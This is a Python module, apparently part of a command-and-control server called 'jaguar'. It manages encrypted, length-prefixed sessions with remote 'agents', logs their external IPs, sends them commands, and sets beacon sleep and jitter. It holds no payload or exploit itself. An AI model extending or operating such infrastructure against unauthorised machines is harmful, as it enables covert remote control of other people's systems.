# -*- coding: utf-8 -*-
"""Sesión de un agente: framing (4 bytes + payload CIFRADO) y ciclo de vida."""
import json
import socket
import struct
import threading

from jaguar.common import cripto


def _recv_exacto(conn, n):
    buf = b""
    while len(buf) < n:
        try:
            c = conn.recv(n - len(buf))
        except (socket.timeout, OSError):
            return None
        if not c:
            return None
        buf += c
    return buf


def enviar(conn, obj, lock=None):
    datos = json.dumps(obj, ensure_ascii=False).encode("utf-8")
    c = cripto.cifrar(datos)
    paquete = struct.pack(">I", len(c)) + c
    if lock:
        with lock:
            conn.sendall(paquete)
    else:
        conn.sendall(paquete)


def recibir(conn):
    cab = _recv_exacto(conn, 4)
    if not cab:
        return None
    (n,) = struct.unpack(">I", cab)
    datos = _recv_exacto(conn, n)
    if datos is None:
        return None
    try:
        return json.loads(cripto.descifrar(datos).decode("utf-8"))
    except Exception:
        return {}


class Sesion:
    def __init__(self, cid, conn, addr, servidor):
        self.cid = cid
        self.conn = conn
        self.addr = addr
        self.servidor = servidor
        self.info = {}
        self.lock = threading.Lock()
        self.activo = False
        self._cerrada = False
        self._hilo = None

    def iniciar(self):
        self.activo = True
        self._hilo = threading.Thread(target=self._bucle, daemon=True)
        self._hilo.start()

    def _bucle(self):
        try:
            primer = recibir(self.conn)                 # handshake
            if not primer or primer.get("tipo") != "hola":
                return
            self.info = primer.get("info", {}) or {}
            self.info["ip_externa"] = self.addr[0]
            self.servidor.cliente_conectado.emit(self.cid, self.info)
            while self.activo:
                msg = recibir(self.conn)
                if msg is None:
                    break
                self.servidor.mensaje_recibido.emit(self.cid, msg)
        except Exception as e:
            self.servidor.log.emit(f"[sesión {self.cid[:8]}] error: {e}")
        finally:
            self.cerrar()

    def enviar(self, obj):
        enviar(self.conn, obj, self.lock)

    def enviar_comando(self, cmd, args=None):
        self.enviar({"tipo": "comando", "cmd": cmd, "args": args or {}})

    def enviar_beacon(self, sleep, jitter):
        self.enviar({"tipo": "beacon", "sleep": sleep, "jitter": jitter})

    def cerrar(self):
        if self._cerrada:
            return
        self._cerrada = True
        self.activo = False
        try:
            self.conn.shutdown(socket.SHUT_RDWR)
        except Exception:
            pass
        try:
            self.conn.close()
        except Exception:
            pass
        self.servidor.sesiones.pop(self.cid, None)
        self.servidor.cliente_desconectado.emit(self.cid)